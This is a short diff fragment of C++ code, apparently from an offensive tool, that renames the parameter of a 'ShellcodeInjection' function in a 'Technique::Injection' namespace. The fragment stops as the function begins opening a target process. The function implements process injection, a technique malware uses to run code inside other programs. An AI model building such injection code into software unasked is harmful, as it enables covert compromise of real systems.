@@ -2,14 +2,17 @@
 
 namespace Technique::Injection
 {
-    BOOL ShellcodeInjection(Procs::PPROCS pProcs, DWORD dwPID, const std::vector<BYTE>& shellcode)
+    BOOL ShellcodeInjection(
+        Procs::PPROCS pProcs,
+        DWORD dwPID,
+        const std::vector<BYTE>& bytes)
     {
         HANDLE hProcess;
         HANDLE hThread;
         LPVOID lpRemoteBuffer;
 
-        LPVOID lpBuffer     = (LPVOID)shellcode.data();
-        SIZE_T dwBufferLen  = shellcode.size();
+        LPVOID lpBuffer     = (LPVOID)bytes.data();
+        SIZE_T dwBufferLen  = bytes.size();
 
         hProcess = System::Process::ProcessOpen(
             pProcs,
